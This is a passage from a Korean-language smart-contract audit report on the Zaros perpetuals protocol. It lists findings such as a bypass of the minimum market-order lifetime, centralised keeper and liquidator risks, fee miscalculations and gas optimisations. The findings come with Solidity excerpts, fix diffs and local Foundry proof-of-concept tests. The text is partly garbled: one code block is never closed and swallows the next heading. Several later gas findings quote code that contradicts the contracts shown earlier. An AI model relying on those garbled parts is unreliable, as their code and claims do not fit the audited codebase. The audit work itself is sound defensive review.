**설명:** `OrderBranch::createMarketOrder`는 이전 보류 중인 시장 주문을 취소하고 새 시장 주문을 열기 전에 `marketOrderMinLifetime`을 검증합니다:
```solidity
File: OrderBranch.sol
                // @audit `createMarketOrder` enforces minimum market order lifetime
210:         marketOrder.checkPendingOrder();
211:         marketOrder.update({ marketId: params.marketId, sizeDelta: params.sizeDelta });

File: MarketOrder.sol
55:     function checkPendingOrder(Data storage self) internal view {
56:         GlobalConfiguration.Data storage globalConfiguration = GlobalConfiguration.load();
57:         uint128 marketOrderMinLifetime = globalConfiguration.marketOrderMinLifetime;
58:
59:         if (self.timestamp != 0 && block.timestamp - self.timestamp <= marketOrderMinLifetime) {
60:             revert Errors.MarketOrderStillPending(self.timestamp);
61:         }
62:     }
```

그러나 `OrderBranch::cancelMarketOrder`에서 사용자는 검증 없이 보류 중인 시장 주문을 취소할 수 있습니다:
```solidity
File: OrderBranch.sol
219:     function cancelMarketOrder(uint128 tradingAccountId) external {
220:         MarketOrder.Data storage marketOrder = MarketOrder.loadExisting(tradingAccountId);
221:         // @audit 최소 시장 주문 수명을 강제하지 않음
222:         marketOrder.clear();
223:
224:         emit LogCancelMarketOrder(msg.sender, tradingAccountId);
225:     }
```

따라서 사용자는 먼저 `cancelMarketOrder`를 호출하여 이전 시장 주문을 취소하고 언제든지 새 주문을 열 수 있습니다.

**영향:** `cancelMarketOrder`를 먼저 호출하여 `marketOrderMinLifetime` 요구 사항을 우회할 수 있습니다.

**권장 완화 방법:** `cancelMarketOrder`는 `marketOrderMinLifetime` 요구 사항을 확인해야 합니다.

```diff
    function cancelMarketOrder(uint128 tradingAccountId) external {
        MarketOrder.Data storage marketOrder = MarketOrder.loadExisting(tradingAccountId);

+       marketOrder.checkPendingOrder();

        marketOrder.clear();

        emit LogCancelMarketOrder(msg.sender, tradingAccountId);
    }
```

**Zaros:** 커밋 [41eae0e](https://github.com/zaros-labs/zaros-core/commit/41eae0ea8f04ffd877484bd7b430d7d85893f421#diff-1329f2388c20edbc7edf3e949fdb903992444d015a681e83fc62a6a02ef51b76R236)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 프로토콜 팀이 중앙 집중식 키퍼를 통해 트레이더를 검열할 수 있음

**설명:** 프로토콜 팀은 다음과 같은 이유로 트레이더를 검열할 수 있습니다:
* 키퍼만이 트레이더의 시장 주문을 이행할 수 있음
* 프로토콜 팀이 어떤 주소가 키퍼가 될 수 있는지를 제어함

**영향:** 프로토콜 팀은 주문을 절대 채우지 않음으로써 트레이더를 검열할 수 있습니다; 예를 들어, 트레이더가 오픈 레버리지 포지션을 닫는 것을 막을 수 있으며, 이는 시장이 포지션에 불리하게 움직일 경우 청산 대상이 되기 때문에 트레이더에게 심각한 불이익을 줍니다.

프로토콜 팀은 또한 일부 트레이더에게 이익이 되는 보류 중인 거래를 채우기 위해 특정 주문을 선택함으로써 다른 트레이더보다 일부 트레이더를 선호할 수 있습니다.

**권장 완화 방법:** 프로토콜 버전 1을 메인넷에 출시하는 관점에서는 중앙 집중식 키퍼를 사용하는 것이 더 쉽고 간단하며 프로토콜 팀에게 프로토콜에 대한 더 많은 제어 권한을 제공합니다. 또한 프로토콜에 대한 신뢰를 무너뜨릴 것이기 때문에 프로토콜 팀이 이 메커니즘을 남용할 위험은 거의 없을 것입니다. 그러나 장기적으로는 분산형 키퍼로 이동하는 것이 이상적입니다.

**Zaros:** 인지함.


### 프로토콜 팀이 중앙 집중식 청산인을 통해 트레이더 청산을 우선적으로 거부할 수 있음

**설명:** 프로토콜 팀은 다음과 같은 이유로 트레이더 청산을 우선적으로 거부할 수 있습니다:
* 청산인만이 청산 대상인 트레이더를 청산할 수 있음
* 프로토콜 팀이 어떤 주소가 청산인이 될 수 있는지를 제어함

**영향:** 프로토콜 팀은 일부 트레이더(예: 일부 거래 계정이 프로토콜 및/또는 팀 구성원에 의해 운영되는 경우)에 대한 청산을 거부하여 청산 없이 불리한 시장 움직임을 견딜 수 있게 함으로써 다른 트레이더보다 유리한 위치를 제공할 수 있습니다.

**권장 완화 방법:** 프로토콜 버전 1을 메인넷에 출시하는 관점에서는 중앙 집중식 청산인을 사용하는 것이 더 쉽고 간단하며 프로토콜 팀에게 프로토콜에 대한 더 많은 제어 권한을 제공합니다. 또한 프로토콜에 대한 신뢰를 무너뜨릴 것이기 때문에 프로토콜 팀이 이 메커니즘을 남용할 위험은 거의 없을 것입니다. 그러나 장기적으로는 분산형 청산인으로 이동하는 것이 이상적입니다.

**Zaros:** 인지함.


### 트레이더가 시장 주문 생성 시 슬리피지(slippage) 및 만료 시간을 제한할 수 없음

**설명:** 트레이더는 시장 주문을 생성할 때 슬리피지와 만료 시간을 제한할 수 없습니다.

**영향:** 트레이더의 주문은 예상보다 늦게 그리고 덜 유리한 가격으로 채워질 수 있습니다.

**권장 완화 방법:** 트레이더가 허용할 수 있는 최대 슬리피지(허용 가능한 가격)와 주문이 채워져야 하는 만료 시간을 지정할 수 있도록 허용하십시오.

가격은 `SettlementBranch::_fillOrder`의 `ctx.fillPrice`에 저장된 "Mark Price"와 대조하여 검증되어야 합니다.

흥미롭게도 `leaves/MarketOrder.sol`의 `Data` 구조체에는 트레이더가 주문을 생성한 타임스탬프인 `timestamp` 변수가 있지만, 주문이 채워질 때 이는 확인되지 않습니다.

**Zaros:** 커밋 [62c0e61](https://github.com/zaros-labs/zaros-core/commit/62c0e613ab02435dc0c3de9abdb14d7d880f2941)에서 사용자가 `targetPrice`를 지정할 수 있는 새로운 "Off-Chain" 주문 기능을 구현했습니다. 이 기능은 추가적인 오프체인 코드를 사용하여 지정가, 역지정가(stop), 이익 실현/손절매(TP/SL) 및 기타 유형의 트리거 기반 주문을 구현할 수 있을 만큼 유연합니다.

**Cyfrin:** 이 새로운 기능이 `targetPrice` 조건을 통해 사용자가 슬리피지를 강제할 수 있는 방법을 제공함을 확인했습니다. 새로운 기능은 마감 기한 확인을 제공하지 않지만, 사용자가 주문 상태를 주시하고 오프체인에서 취소할 수 있으므로 덜 중요합니다. 또한 이 새로운 기능의 보안은 이번 감사 중에 평가되지 않았지만 이어지는 경쟁 감사에서 평가될 것입니다.


### PNL의 절대값이 주문 및 정산 수수료의 합보다 작으면 `SettlementBranch::_fillOrder`가 되돌려짐(revert)

**설명:** `SettlementBranch::_fillOrder`는 포지션의 PNL을 `pnl = unrealizedPnl + accruedFunding + unary(orderFee + settlementFee)`로 계산합니다:

```solidity
File: SettlementBranch.sol
141: ctx.pnl = oldPosition.getUnrealizedPnl(ctx.fillPrice).add(
142:     oldPosition.getAccruedFunding(ctx.fundingFeePerUnit)
143:     ).add(unary(ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18())));
144:
```

PNL이 양수이고 `unrealized_pnl + accrued_funding < order_fee + settlement_fee`이면 언더플로로 인해 되돌려집니다.

PNL이 음수이면 계정의 증거금에서 금액이 공제됩니다:

```solidity
171: if (ctx.pnl.lt(SD_ZERO)) {
172:     UD60x18 marginToDeductUsdX18 = ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18()).gt(SD_ZERO)
         // @audit abs(pnl) < order_fee+settlement_fee이면 언더플로로 되돌려질(revert) 수 있음
173:     ? ctx.pnl.abs().intoUD60x18().sub(ctx.orderFeeUsdX18.intoUD60x18().add(ctx.settlementFeeUsdX18))
174:     : ctx.pnl.abs().intoUD60x18();
175:
176:     tradingAccount.deductAccountMargin({
177:         feeRecipients: FeeRecipients.Data({
178:         marginCollateralRecipient: globalConfiguration.marginCollateralRecipient,
179:         orderFeeRecipient: globalConfiguration.orderFeeRecipient,
180:         settlementFeeRecipient: globalConfiguration.settlementFeeRecipient
181:     }),
182:     pnlUsdX18: marginToDeductUsdX18,
183:     orderFeeUsdX18: ctx.orderFeeUsdX18.gt(SD_ZERO) ? ctx.orderFeeUsdX18.intoUD60x18() : UD_ZERO,
184:     settlementFeeUsdX18: ctx.settlementFeeUsdX18
185:     });
```

다음과 같은 경우 L173의 `marginToDeductUsdX18` 계산의 첫 번째 조건은 언더플로로 인해 되돌려집니다:
* 트레이더에게 손실(음수 PNL)이 있음
* 손실의 절대값이 주문/정산 수수료의 합보다 작음

**개념 증명 (Proof of Concept):** `test/integration/perpetuals/order-branch/createMarketOrder/createMarketOrder.t.sol`에 다음 PoC를 추가하십시오:
```solidity
function test_OrderRevertsUnderflowWhenPositivePnlLessThanFees() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 0.002e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // market moves slightly against Naruto's position
    // giving Naruto's position a slightly negative PNL
    updateMockPriceFeed(BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE+1);

    // naruto attempts to close their position
    changePrank({ msgSender: users.naruto });

    // reverts due to underflow
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA/2);
}

function test_OrderRevertsUnderflowWhenNegativePnlLessThanFees() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 0.002e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // market moves slightly against Naruto's position
    // giving Naruto's position a slightly negative PNL
    updateMockPriceFeed(BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE-1);

    // naruto attempts to partially close their position
    changePrank({ msgSender: users.naruto });

    // reverts due to underflow
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA/2);
}
```

실행:
* `forge test --match-test test_OrderRevertsUnderflowWhenPositivePnlLessThanFees -vvv`
* `forge test --match-test test_OrderRevertsUnderflowWhenNegativePnlLessThanFees -vvv`

**권장 완화 방법:** 이전 포지션 PNL이 정산되고 주문/정산 수수료가 지불되는 방식 리팩토링.

**Zaros:** 커밋 [516bc2a](https://github.com/zaros-labs/zaros-core/commit/516bc2ad61d64e94654db500a93bd19567ca01e5)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 스큐(skew)가 0이고 거래가 매수 주문일 때 `PerpMarket::getOrderFeeUsd`가 `makerFee`를 잘못 부과함

**설명:** `PerpMarket::getOrderFeeUsd`에는 제가 끝에 (*)를 추가한 이 주석이 있습니다:
```solidity
/// @dev When the skew is zero, taker fee will be charged. (*)
```

그러나 `if` 문의 부울 표현식에 대한 진리표(truth table)를 작성하면 이 주석이 항상 참은 아님을 알 수 있습니다:
```solidity
// isSkewGtZero = true,  isBuyOrder = true  -> taker fee
// isSkewGtZero = true,  isBuyOrder = false -> maker fee
// isSkewGtZero = false, isBuyOrder = true  -> maker fee (*)
// isSkewGtZero = false, isBuyOrder = false -> taker fee
if (isSkewGtZero != isBuyOrder) {
    // not equal charge maker fee
    feeBps = sd59x18((self.configuration.orderFees.makerFee));
} else {
    // equal charge taker fee
    feeBps = sd59x18((self.configuration.orderFees.takerFee));
}
```

`isSkewGtZero == false && isBuyOrder = true`일 때, 스큐가 0이므로 이 주문이 스큐를 유발함에도 불구하고 *메이커* 수수료가 청구됩니다. 이 동작은 주석이 말하는 것과 반대이며, 논리적으로 거래가 스큐를 유발하는 경우 *테이커* 수수료가 청구되어야 합니다.

**영향:** 잘못된 수수료가 청구됩니다.

**권장 완화 방법:** `isSkewGtZero == false && isBuyOrder = true`일 때 트레이더가 스큐를 유발하므로 *테이커* 수수료가 청구되어야 합니다.

**Zaros:** 커밋 [534b089](https://github.com/zaros-labs/zaros-core/commit/534b0891d836e1cd01daf808f72c39269aa213ae) 및 [5822b19](https://github.com/zaros-labs/zaros-core/commit/5822b19b987b23fb3373afc0fb3e7a30441cdd01)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `PerpMarket::getOrderFeeUsd`는 스큐를 뒤집는(flip) 트레이더에게 전체 거래에 대해 `makerFee`로 보상함

**설명:** `PerpMarket::getOrderFeeUsd`는 스큐를 뒤집는 트레이더에게 전체 거래에 대해 `makerFee`로 보상합니다. 트레이더가 스큐를 뒤집었으므로 그들의 거래는 부분적으로 반대 스큐를 생성했고, 따라서 그들의 거래는 부분적으로 `maker`일 뿐만 아니라 `taker`이기도 하므로 이는 이상적이지 않습니다.

**영향:** 트레이더는 스큐를 뒤집을 때 부분적으로만 `makerFee`를 받는 대신 전체를 받음으로써 내야 할 수수료보다 약간 적게 지불합니다.

**권장 완화 방법:** 거래가 스큐를 뒤집을 때, 트레이더는 스큐를 0으로 이동시킨 거래 부분에 대해서만 `makerFee`를 지불해야 합니다. 그런 다음 트레이더는 스큐를 뒤집은 나머지 거래 부분에 대해 `takerFee`를 지불해야 합니다.

**Zaros:** 커밋 [5822b19](https://github.com/zaros-labs/zaros-core/commit/5822b19b987b23fb3373afc0fb3e7a30441cdd01)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `OrderBranch::getMarginRequirementForTrade`는 증거금 요건 계산 시 주문 및 정산 수수료를 포함하지 않음

**설명:** `OrderBranch::getMarginRequirementForTrade`는 증거금 요건을 계산할 때 주문 및 정산 수수료를 포함하지 않지만, [`OrderBranch::createMarketOrder`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/branches/OrderBranch.sol#L197-L208)와 같은 다른 곳에서는 발생합니다.

**영향:** `OrderBranch::getMarginRequirementForTrade`는 실제로 필요한 것보다 낮은 담보 요건을 반환합니다. 이 함수는 스마트 계약 어디에서도 사용되지 않는 것으로 보이므로 사용자 인터페이스에만 영향을 미칠 가능성이 있습니다.

**권장 완화 방법:** `OrderBranch::getMarginRequirementForTrade`는 증거금 요건을 계산할 때 주문 및 정산 수수료를 반영해야 합니다. 다음과 같이 수행하는 `OrderBranch::simulateTrade`를 복사할 수 있습니다:
```solidity
orderFeeUsdX18 = perpMarket.getOrderFeeUsd(sd59x18(sizeDelta), fillPriceX18);
settlementFeeUsdX18 = ud60x18(uint256(settlementConfiguration.fee));
```

**Zaros:** 커밋 [5542a04](https://github.com/zaros-labs/zaros-core/commit/5542a04c976d705ad0fcc86eff58a4ad815d4535)에서 수정되었습니다.

**Cyfrin:** 확인됨.

\clearpage
## 정보성 (Informational)


### 사용되지 않는 변수

**설명:** 일부 오류와 상수는 코드베이스에서 사용되지 않습니다.

```solidity
File: Errors.sol
11:     error InvalidParameter(string parameter, string reason);
38:     error OnlyForwarder(address sender, address forwarder);
79:     error InvalidLiquidationReward(uint128 liquidationFeeUsdX18);

File: Constants.sol
10:     uint32 internal constant MAX_MIN_DELEGATE_TIME = 30 days;
```

**Zaros:** 커밋 [37071ed](https://github.com/zaros-labs/zaros-core/commit/37071ed2c6845121e2eda4143ad233d20a1d7e6f)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `params.initialMarginRateX18 <= params.maintenanceMarginRateX18`일 때 더 적합한 오류 유형 반환

**설명:** `GlobalConfigurationBranch::createPerpMarket`에서 다음 두 가지 오류 사례는 모두 `ZeroInput` 오류 유형을 반환합니다:
```solidity
if (params.initialMarginRateX18 <= params.maintenanceMarginRateX18) {
    revert Errors.ZeroInput("initialMarginRateX18");
}
if (params.initialMarginRateX18 == 0) {
    revert Errors.ZeroInput("initialMarginRateX18");
}
```

`initialMarginRateX18 < maintenanceMarginRateX18`인 첫 번째 경우 오류는 오해의 소지가 있습니다. `InvalidParameter`와 같은 더 적합한 오류 유형을 반환해야 합니다.

`GlobalConfigurationBranch::updatePerpMarketConfiguration`에서도 동일한 현상이 발생하지만, 여기서는 두 번째 확인 `initialMarginRateX18 == 0`이 생략되었습니다. 이 확인을 추가할지 고려하십시오.

첫 번째 검증이 항상 먼저 되돌려지기 때문에 두 번째 검증은 중복될 수 있습니다; 0인 경우에 대해 특정 오류를 원한다면 먼저 수행하고, 그렇지 않으면 제거를 고려하십시오.

**Zaros:** 커밋 [c35e2be](https://github.com/zaros-labs/zaros-core/commit/c35e2bea50a0753726ac79503e607e9dcf637b6b)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `accountId` 데이터 유형 표준화

**설명:** `accountId`는 다른 계약에서 다른 데이터 유형을 사용합니다:
* [`GlobalConfiguration::Data`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/leaves/GlobalConfiguration.sol#L44)에서 `uint96`
* [`TradingAccount::Data`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/leaves/TradingAccount.sol#L45) 및 [`TradingAccountBranch::createTradingAccount`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/branches/TradingAccountBranch.sol#L219)에서 `uint128`
* [`AccountNFT`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/account-nft/AccountNFT.sol#L18-L22)에서 `uint256`.

**권장 완화 방법:** 모든 곳에서 하나의 데이터 유형으로 표준화하십시오.

**Zaros:** 기본값으로 uint128 데이터 유형을 사용할 것이지만:
* 스토리지 값을 팩(pack)하기 위해 `GlobalConfiguration::Data`에서는 `uint96`
* `ERC721::_update`를 재정의(override)하기 위해 AccountNFT에서는 `uint256`


### `LogConfigureMarginCollateral` 이벤트가 `loanToValue`를 방출하지 않음

**설명:** [LogConfigureMarginCollateral](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/branches/GlobalConfigurationBranch.sol#L212) 이벤트는 마진 담보 구성 중 `loanToValue`를 생략합니다.

**권장 완화 방법:** `loanToValue`도 방출할 것을 권장합니다.

**Zaros:** 커밋 [aef72cd](https://github.com/zaros-labs/zaros-core/commit/aef72cdc4319314c2a4b9497ba39a5621657f7b4)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 무기한 시장 생성/업데이트 중 일관성 없는 검증

**설명:** `GlobalConfigurationBranch::createPerpMarket`은 `maxFundingVelocity`가 0이면 [되돌려지지만](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/branches/GlobalConfigurationBranch.sol#L351-L353), `GlobalConfigurationBranch::updatePerpMarketConfiguration`에서는 동일한 확인이 발생하지 않습니다.

**권장 완화 방법:** 무기한 시장을 생성하고 업데이트할 때 동일한 검증을 적용하는 것을 고려하십시오.

**Zaros:** 커밋 [ad2bcb1](https://github.com/zaros-labs/zaros-core/commit/ad2bcb114a9aaa0ed8838e05335d78badb51032b)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `GlobalConfigurationBranch::updateSettlementConfiguration`이 존재하지 않는 `marketId`에 대해 호출될 수 있음

**설명:** `GlobalConfigurationBranch::updateSettlementConfiguration`은 `marketId`가 존재하는지 확인하지 않습니다:

```solidity
function updateSettlementConfiguration(
    uint128 marketId,
    uint128 settlementConfigurationId,
    SettlementConfiguration.Data memory newSettlementConfiguration
)
    external
    onlyOwner
{
    SettlementConfiguration.update(marketId, settlementConfigurationId, newSettlementConfiguration);

    emit LogUpdateSettlementConfiguration(msg.sender, marketId, settlementConfigurationId);
}
```

그러나 `updatePerpMarketStatus`와 같은 다른 함수는 `marketId`가 존재하는지 확인합니다:

```solidity
function updatePerpMarketStatus(uint128 marketId, bool enable) external onlyOwner {
    GlobalConfiguration.Data storage globalConfiguration = GlobalConfiguration.load();
    PerpMarket.Data storage perpMarket = PerpMarket.load(marketId);

    if (!perpMarket.initialized) {
        revert Errors.PerpMarketNotInitialized(marketId);
    }
```

**권장 완화 방법:** `updateSettlementConfiguration`에서 `marketId` 유효성을 확인하십시오.

**Zaros:** 커밋 [75be42e](https://github.com/zaros-labs/zaros-core/commit/75be42e892c13cb26876d66b0c5184971700714e)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 담보 가격 피드가 0을 반환하면 청산이 되돌려짐(revert)

**설명:** 담보 가격 피드가 0을 반환하면 청산이 되돌려집니다. 일반적으로 Chainlink 가격 피드에는 항상 적어도 반환해야 하는 `minAnswer`가 내장되어 있으므로 이런 일은 발생하지 않아야 합니다. 그러나 트레이더가 다양한 담보 바스켓을 가질 수 있으므로, 이 극단적인 경우를 처리하고 다른 담보를 청산하려고 시도하는 것이 가치가 있을 수 있습니다.

**개념 증명 (Proof of Concept):** `test/integration/perpetuals/liquidation-branch/liquidateAccounts/liquidateAccounts.t.sol`에 다음 PoC를 추가하십시오:
```solidity
function test_LiquidationRevertsWhenPriceFeedReturnsZero() external {
    // give naruto some wstEth to deposit as collateral
    uint256 USER_STARTING_BALANCE = 1e18;
    int128  USER_POS_SIZE_DELTA   = 1e18;
    deal({ token: address(mockWstEth), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(mockWstEth));

    // naruto opens first position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // price of naruto's collateral has a LUNA-like crash
    // this code occur while the L2 stopped producing blocks
    // as recently happened during the Linea hack such that
    // the liquidation bots could not perform a timely
    // liquidation of the position
    MockPriceFeed wstEthPriceFeed = mockPriceAdapters.mockWstEthUsdPriceAdapter;
    wstEthPriceFeed.updateMockPrice(0);

    // verify naruto can now be liquidated
    uint128[] memory liquidatableAccountsIds = perpsEngine.checkLiquidatableAccounts(0, 1);
    assertEq(1, liquidatableAccountsIds.length);
    assertEq(tradingAccountId, liquidatableAccountsIds[0]);

    // attempt to liquidate naruto
    changePrank({ msgSender: liquidationKeeper });
    // reverts with `panic: division or modulo by zero`
    perpsEngine.liquidateAccounts(liquidatableAccountsIds, users.settlementFeeRecipient);
}
```

실행: `forge test --match-test test_LiquidationRevertsWhenPriceFeedReturnsZero -vvv`

**Zaros:** 인지함; Chainlink 가격 피드에는 일반적으로 0보다 큰 내장 최소 가격이 있어 반환하므로 발생 가능성이 매우 낮습니다.

\clearpage
## 가스 최적화 (Gas Optimization)


### 반환 변수당 9 가스를 절약하기 위해 명명된 반환 변수 사용

**설명:** 반환 변수당 9 가스를 절약하고 함수 코드를 단순화하기 위해 명명된 반환 변수를 사용하십시오:

```solidity
File: src/external/ChainlinkUtil.sol
84:        returns (FeeAsset memory)

File: src/perpetuals/branches/OrderBranch.sol
128:        returns (UD60x18, UD60x18) // @audit getMarginRequirementForTrade()에서
144:    function getActiveMarketOrder(uint128 tradingAccountId) external pure returns (MarketOrder.Data memory) {

File: src/perpetuals/leaves/PerpMarket.sol
97:        returns (UD60x18) // @audit getMarkPrice()에서

File: src/tree-proxy/RootProxy.sol
50:    function _implementation() internal view override returns (address) {

// @audit 다음과 같이 리팩토링:
function _implementation() internal view override returns (address branch) {
    RootUpgrade.Data storage rootUpgrade = RootUpgrade.load();

    branch = rootUpgrade.getBranchAddress(msg.sig);
    if (branch == address(0)) revert Errors.UnsupportedFunction(msg.sig);
}
```

**Zaros:** 커밋 [4972f52](https://github.com/zaros-labs/zaros-core/commit/4972f52e04ebbcbe0d56ad2136d8023bb5fc0d9f)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 변수를 기본값으로 초기화하지 않음

**설명:** 이미 수행되었으므로 변수를 기본값으로 초기화하지 마십시오:

```solidity
File: src/tree-proxy/leaves/RootUpgrade.sol
70:        for (uint256 i = 0; i < selectorCount; i++) {
81:        for (uint256 i = 0; i < branchCount; i++) {
97:        for (uint256 i = 0; i < branchUpgrades.length; i++) {
117:        for (uint256 i = 0; i < selectors.length; i++) {
136:        for (uint256 i = 0; i < selectors.length; i++) {
171:        for (uint256 i = 0; i < selectors.length; i++) {
202:        for (uint256 i = 0; i < initializables.length; i++) {

File: src/perpetuals/leaves/GlobalConfiguration.sol
96:        for (uint256 i = 0; i < collateralTypes.length; i++) {

File: src/perpetuals/branches/GlobalConfigurationBranch.sol
185:        for (uint256 i = 0; i < liquidators.length; i++) {

File: src/perpetuals/leaves/PerpMarket.sol
345:            for (uint256 i = 0; i < params.customOrdersConfiguration.length; i++) {

File: src/perpetuals/leaves/TradingAccount.sol
145:        for (uint256 i = 0; i < self.marginCollateralBalanceX18.length(); i++) {
169:        for (uint256 i = 0; i < self.marginCollateralBalanceX18.length(); i++) {
229:        for (uint256 i = 0; i < self.activeMarketsIds.length(); i++) {
264:        for (uint256 i = 0; i < self.activeMarketsIds.length(); i++) {
420:        for (uint256 i = 0; i < globalConfiguration.collateralLiquidationPriority.length(); i++) {

File: src/perpetuals/branches/TradingAccountBranch.sol
122:        for (uint256 i = 0; i < tradingAccount.activeMarketsIds.length(); i++) {
168:        for (uint256 i = 0; i < tradingAccount.activeMarketsIds.length(); i++) {
241:        for (uint256 i = 0; i < data.length; i++) {

File: src/perpetuals/branches/LiquidationBranch.sol
103:        for (uint256 i = 0; i < accountsIds.length; i++) {
### 메모리 배열 길이를 캐시하여 가스 절약

**설명:** `PerpMarket::getSettlementContexts`에서 `activeSettlementContexts` 배열의 길이는 `for` 루프의 각 반복마다 액세스됩니다.

```solidity
    function getSettlementContexts(uint256 marketId)
        external
        view
        returns (SettlementContext[] memory activeSettlementContexts)
    {
        // ...
@>      for (uint256 i; i < activeSettlementContexts.length; i++) {
            activeSettlementContexts[i] =
                self.settlementConfigurations[marketId][settlementConfigurationIds[i].unwrap()];
        }
    }
```

메모리 배열 길이 읽기는 스택 읽기보다 비용이 더 많이 들기 때문에, 읽은 길이를 스택 변수에 캐시하면 가스를 절약할 수 있습니다.

**권장 완화 방법:**
```diff
+       uint256 activeSettlementContextsLength = activeSettlementContexts.length;
-       for (uint256 i; i < activeSettlementContexts.length; i++) {
+       for (uint256 i; i < activeSettlementContextsLength; i++) {
            activeSettlementContexts[i] =
                self.settlementConfigurations[marketId][settlementConfigurationIds[i].unwrap()];
        }
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/d7e003eb8b07223f6e91122a6136a6e7c7a0d1e3"

**Cyfrin:** 확인됨.


### 불변 분기 확인을 루프 밖으로 이동하여 가스 절약

**설명:** `GlobalConfigurationBranch::updateMarketConfiguration`에서 `isInitialized` 확인은 `for` 루프 내부에서 수행됩니다.

```solidity
    function updateMarketConfiguration(
        GlobalConfiguration storage self,
        uint256 marketId,
        MarketConfiguration calldata params
    )
        internal
    {
        // ...
        for (uint256 i; i < settlementConfigurationIds.length; i++) {
            // ...
@>          if (settlementConfiguration.isInitialized) {
                // ...
            }
        }
```

그러나 `isInitialized`는 루프 전체에서 불변(immutable)이어야 합니다. 따라서 이 확인을 루프 밖으로 이동하여 가스 비용을 절약할 수 있습니다.

**권장 완화 방법:** `isInitialized` 확인을 `for` 루프 밖으로 이동하거나 루프 내부에서 중복 확인을 방지하도록 로직을 리팩토링하십시오.

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/c77464da9346d0a7a40ca3bf437e4064d50c950d. 이제 결제 구성이 초기화되었는지 확인합니다."

**Cyfrin:** 확인됨.


### `EnumerableSet::contains` 호출을 피하여 가스 효율성 최적화

**설명:** `PerpMarket::updateSettlementConfiguration` 함수는 `EnumerableSet::contains`를 사용하여 `settlementConfigurationId`가 `settlementConfigurationIds` 집합에 존재하는지 확인합니다. 그 후 집합에 ID를 추가하거나 제거합니다. `add` 및 `remove` 함수는 이미 포함 또는 부재 여부를 확인하고 작업이 성공했는지 여부를 나타내는 불리언(boolean)을 반환합니다.

```solidity
    function updateSettlementConfiguration(
        Market storage self,
        uint128 marketId,
        SettlementConfigurationLibrary.UpdateParams memory params
    )
        internal
    {
        // ...
        // @audit contains is redundant
@>      bool isConfigActive =
            self.settlementConfigurationIds[marketId].contains(SettlementConfigurationId.wrap(params.id));

        if (isConfigActive) {
            if (!params.isEnabled) {
                // @audit remove returns true if the item was present
                self.settlementConfigurationIds[marketId].remove(SettlementConfigurationId.wrap(params.id));
            }
        } else {
            if (params.isEnabled) {
                // @audit add returns true if the item was not present
                self.settlementConfigurationIds[marketId].add(SettlementConfigurationId.wrap(params.id));
            }
        }
        // ...
    }
```

별도의 `contains` 호출을 제거하고 `add` 및 `remove`의 반환 값을 활용하면 함수가 더 가스 효율적이 될 수 있습니다.

**권장 완화 방법:**
```diff
    function updateSettlementConfiguration(
        Market storage self,
        uint128 marketId,
        SettlementConfigurationLibrary.UpdateParams memory params
    )
        internal
    {
        // ...
-       bool isConfigActive =
-           self.settlementConfigurationIds[marketId].contains(SettlementConfigurationId.wrap(params.id));
-
-       if (isConfigActive) {
-           if (!params.isEnabled) {
-               self.settlementConfigurationIds[marketId].remove(SettlementConfigurationId.wrap(params.id));
-           }
-       } else {
-           if (params.isEnabled) {
-               self.settlementConfigurationIds[marketId].add(SettlementConfigurationId.wrap(params.id));
